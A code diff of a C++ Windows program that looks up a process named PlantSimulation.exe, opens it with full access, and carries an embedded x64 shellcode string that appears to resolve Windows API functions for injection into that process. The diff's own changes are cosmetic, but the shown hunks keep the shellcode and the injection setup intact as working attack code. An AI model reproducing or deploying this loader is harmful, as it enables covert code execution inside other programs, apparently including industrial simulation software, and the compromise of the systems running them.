@@ -9,7 +9,7 @@ void helloWorld(){
 DWORD GetProcessIdByName(const wchar_t* processName){
     DWORD processIds[1024], bytesReturned;
     if(!EnumProcesses(processIds, sizeof(processIds), &bytesReturned)){
-        std::cout << "Failed to enumerate processes, please check your privileges." << std::endl;
+        std::cout << "Failed to enumerate processes." << std::endl;
         exit(-1);
     }
 
@@ -30,7 +30,8 @@ DWORD GetProcessIdByName(const wchar_t* processName){
 }
 
 int main(void){
-    const char* shellcode = "\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
+    const char* shellcode = 
+    "\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
     "\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
     "\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
     "\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
@@ -39,6 +40,7 @@ int main(void){
     "\x48\x83\xec\x20\x41\xff\xd6";
     HANDLE pHandle;
     const wchar_t* processName = L"PlantSimulation.exe";
+    
     if(GetProcessIdByName(processName) != -69){
         if((pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetProcessIdByName(processName))) != INVALID_HANDLE_VALUE){
             std::wcout << L"Process " << processName << L" was found !" << std::endl;
@@ -78,4 +80,5 @@ int main(void){
         std::wcout << L"Process " << processName << L" was not found !" << std::endl;
         exit(-1);
     }
+    return 1;
 }
